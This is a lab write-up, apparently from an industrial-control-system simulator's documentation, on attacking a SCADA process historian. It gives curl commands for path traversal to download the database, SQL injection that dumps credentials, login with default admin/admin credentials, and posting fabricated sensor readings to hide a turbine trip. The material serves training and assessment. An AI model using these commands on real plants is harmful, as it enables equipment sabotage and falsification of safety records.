# Historian assessment: the trusted record

![SCADA](/_static/images/ot-scada.png)

*Or: How Ponder Discovered That the Historian's Memory Could Be Edited*

## Why the historian is different

Most OT vulnerabilities are about what an attacker can do: write a register, trip a relay, stop a pump. The
historian vulnerability is about what an attacker can prevent anyone from knowing. It is the difference between
causing an incident and causing an incident that, as far as the record is concerned, never happened.

The process historian is the system that everyone trusts. It is what operators look at when something goes wrong.
It is what the engineering team reviews to understand what the system was doing before the fault. It is what the
regulatory body asks for. It is what the insurer requests after a claim. The historian does not interpret events;
it records them. That is precisely the assumption the ingest poisoning technique exploits.

## The UU P&L historian

The simulator's `uupl-historian` at 10.10.2.10 is a SQLite-backed REST service. It receives readings from the
engineering workstation's polling process and stores them. The SCADA dashboard queries it for historical trend
data. Three endpoints matter for assessment:

| Endpoint | Method | Notes |
|----------|--------|-------|
| `/report?asset=...` | GET | Query historical readings; SQL injection possible |
| `/export?tag=...` | GET | Export data; path traversal possible |
| `/ingest` | POST | Write new readings; credentials required |

## What safe assessment reveals

The path traversal and SQL injection vulnerabilities on the read endpoints are assessable without credentials
and without modifying state:

```bash
# Path traversal: returns the raw SQLite database file
curl "http://10.10.2.10:8080/export?tag=../historian.db" -o historian.db

# SQL injection via the report endpoint
curl "http://10.10.2.10:8080/report?asset=turbine_rpm'+UNION+SELECT+username,password,null+FROM+users--"
```

The database file contains alarm thresholds, historical sensor readings, and the ingest credentials. The alarm
thresholds are operationally useful: knowing the exact value at which a relay trips allows for a relay threshold
write that produces a protection event without triggering any historian alarm at all.

The same ingest credentials are also disclosed by the SCADA server's `/config` endpoint, reachable after
logging in with the default `admin / admin` credentials:

```bash
curl -u admin:admin http://10.10.2.20:8080/config
```

Security implication: read access to the historian is achievable without any credentials and reveals both
operational intelligence and the keys to write access.

## The ingest attack in the simulator

Once ingest credentials are available, the sequence is:

1. Read the current turbine RPM and process values from the PLC, to know what normal looks like
2. Trip the turbine via emergency stop, overspeed, or relay threshold write
3. Immediately begin POSTing fabricated normal readings to `/ingest` at the polling interval

```bash
curl -X POST http://10.10.2.10:8080/ingest \
     -u hist_read:history2017 \
     -H 'Content-Type: application/json' \
     -d '{"tag": "turbine_rpm", "value": 2930, "timestamp": "2026-06-03T14:22:00Z"}'
```

Repeat for the duration of the outage. The SCADA dashboard, which queries the historian for trend data, shows
continuous normal operation during the period in question.

The consequence is that the outage becomes invisible to anyone relying on the historian: the control room
operator watching the trend chart, the shift engineer reviewing the log at handover, the reliability team
calculating availability metrics. Only a system that does not feed through the historian, such as the engineering
workstation's direct poll log, or the revenue meter's SNMP counters, would show any discrepancy.

This technique is only appropriate on the simulator. On a production system it would involve writing false data
to a legally significant operational record.

## What the testing revealed

The chain at UU P&L runs: default SCADA credentials → `/config` endpoint → ingest credentials → historian
write access → fabricated normal readings during an outage.

No step requires anything beyond credentials that were never changed and a curiosity about what `/config`
returns.

The historian's ingest endpoint is the mechanism for rewriting what happened. The path traversal and SQL
injection vulnerabilities are routes to the credentials that make that rewriting possible. Together they mean
that an attacker who gains any foothold in the operational zone has a credible path to editing the facility's
operational record retrospectively.

The more unsettling observation is that the edit is undetectable without a reference point outside the
historian's own data. The historian is trusted because it has always been trustworthy. That trust is what
the attack relies on.

Ponder's assessment note: "The morning after an incident is not the right time to discover that the
operational record can be told what to say. A historian that accepts ingest credentials derivable from the SCADA
server's own configuration is not a reliable record. It is a record that can be edited. The difference between
those two things is most visible when everyone agrees that nothing unusual appears in the logs, and the physical
evidence says otherwise."

Related runbooks (in the ICS Access SimLab, to be linked once migrated into this repository):

- Historian ingest poisoning runbook: step-by-step attack with expected responses
- Historian path traversal runbook: read-only credential harvesting